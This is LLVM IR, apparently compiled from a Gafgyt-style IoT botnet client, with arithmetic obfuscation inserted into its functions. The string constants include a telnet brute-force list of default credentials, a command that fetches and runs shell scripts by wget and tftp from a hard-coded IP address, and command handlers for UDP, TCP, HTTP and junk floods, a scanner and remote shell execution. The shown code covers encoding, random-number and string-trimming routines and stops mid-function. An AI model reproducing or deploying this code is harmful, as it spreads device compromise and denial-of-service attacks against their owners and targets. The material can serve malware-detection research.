; ModuleID = 'host/ir_sub/L7.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\5C147\5C141\5C171\5C146\5C147\5C164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @encode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %53, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %58

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %46, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %53

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %45

; <label>:33:                                     ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = sub i32 0, 1
  %43 = sub i32 %41, %42
  %44 = add nsw i32 %41, 1
  store i32 %43, i32* %4, align 4
  br label %45

; <label>:45:                                     ; preds = %33, %20
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* %5, align 4
  %48 = sub i32 0, %47
  %49 = sub i32 0, 1
  %50 = add i32 %48, %49
  %51 = sub i32 0, %50
  %52 = add nsw i32 %47, 1
  store i32 %51, i32* %5, align 4
  br label %16

; <label>:53:                                     ; preds = %16
  %54 = load i32, i32* %3, align 4
  %55 = sub i32 0, 1
  %56 = sub i32 %54, %55
  %57 = add nsw i32 %54, 1
  store i32 %56, i32* %3, align 4
  br label %9

; <label>:58:                                     ; preds = %9
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %60
  store i8 0, i8* %61, align 1
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %63 = call noalias i8* @strdup(i8* %62) #4
  store i8* %63, i8** %7, align 8
  %64 = load i8*, i8** %7, align 8
  ret i8* %64
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #1

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @strdup(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @decode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %52, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %57

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %46, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %52

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %45

; <label>:33:                                     ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = sub i32 0, 1
  %43 = sub i32 %41, %42
  %44 = add nsw i32 %41, 1
  store i32 %43, i32* %4, align 4
  br label %45

; <label>:45:                                     ; preds = %33, %20
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* %5, align 4
  %48 = add i32 %47, 1183174944
  %49 = add i32 %48, 1
  %50 = sub i32 %49, 1183174944
  %51 = add nsw i32 %47, 1
  store i32 %50, i32* %5, align 4
  br label %16

; <label>:52:                                     ; preds = %16
  %53 = load i32, i32* %3, align 4
  %54 = sub i32 0, 1
  %55 = sub i32 %53, %54
  %56 = add nsw i32 %53, 1
  store i32 %55, i32* %3, align 4
  br label %9

; <label>:57:                                     ; preds = %9
  %58 = load i32, i32* %4, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %59
  store i8 0, i8* %60, align 1
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %62 = call noalias i8* @strdup(i8* %61) #4
  store i8* %62, i8** %7, align 8
  %63 = load i8*, i8** %7, align 8
  ret i8* %63
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, -1640531527
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %11 = load i32, i32* %2, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, -1640531527
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add i32 %11, -1640531527
  %17 = add i32 %15, 1024211927
  %18 = add i32 %17, -1640531527
  %19 = sub i32 %18, 1024211927
  %20 = add i32 %15, -1640531527
  store i32 %19, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %21

; <label>:21:                                     ; preds = %66, %1
  %22 = load i32, i32* %3, align 4
  %23 = icmp slt i32 %22, 4096
  br i1 %23, label %24, label %72

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %3, align 4
  %26 = sub i32 0, 3
  %27 = add i32 %25, %26
  %28 = sub nsw i32 %25, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = sub i32 0, 2
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %31, -1
  %40 = and i32 %38, %39
  %41 = xor i32 %38, -1
  %42 = and i32 %31, %41
  %43 = or i32 %40, %42
  %44 = xor i32 %31, %38
  %45 = xor i32 %43, -1
  %46 = and i32 -1640531527, %45
  %47 = xor i32 -1640531527, -1
  %48 = and i32 %43, %47
  %49 = or i32 %46, %48
  %50 = xor i32 %43, -1640531527
  %51 = load i32, i32* %3, align 4
  %52 = xor i32 %49, -1
  %53 = and i32 -2111121920, %52
  %54 = xor i32 -2111121920, -1
  %55 = and i32 %49, %54
  %56 = xor i32 %51, -1
  %57 = and i32 %56, -2111121920
  %58 = and i32 %51, %54
  %59 = or i32 %53, %55
  %60 = or i32 %57, %58
  %61 = xor i32 %59, %60
  %62 = xor i32 %49, %51
  %63 = load i32, i32* %3, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %24
  %67 = load i32, i32* %3, align 4
  %68 = add i32 %67, -779972452
  %69 = add i32 %68, 1
  %70 = sub i32 %69, -779972452
  %71 = add nsw i32 %67, 1
  store i32 %70, i32* %3, align 4
  br label %21

; <label>:72:                                     ; preds = %21
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, -1151192937
  %7 = add i32 %6, 1
  %8 = add i32 %7, -1151192937
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 -561762082, -1
  %13 = or i32 %10, %11
  %14 = or i32 -561762082, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 %24, -2013609790173189307
  %28 = add i64 %27, %26
  %29 = add i64 %28, -2013609790173189307
  %30 = add i64 %24, %26
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = sub i64 0, %36
  %38 = sub i64 %34, %37
  %39 = add i64 %34, %36
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %3, align 4
  %41 = load i32, i32* %3, align 4
  %42 = load i32, i32* @c, align 4
  %43 = icmp ult i32 %41, %42
  br i1 %43, label %44, label %56

; <label>:44:                                     ; preds = %0
  %45 = load i32, i32* %3, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, 1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add i32 %45, 1
  store i32 %49, i32* %3, align 4
  %51 = load i32, i32* @c, align 4
  %52 = add i32 %51, -1674851197
  %53 = add i32 %52, 1
  %54 = sub i32 %53, -1674851197
  %55 = add i32 %51, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %44, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 %57, -412190318
  %60 = sub i32 %59, %58
  %61 = add i32 %60, -412190318
  %62 = sub i32 %57, %58
  %63 = load i32, i32* @rand_cmwc.i, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = add i64 %7, 4946016792671227951
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, 4946016792671227951
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %27

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %4, align 4
  br label %13

; <label>:27:                                     ; preds = %13
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

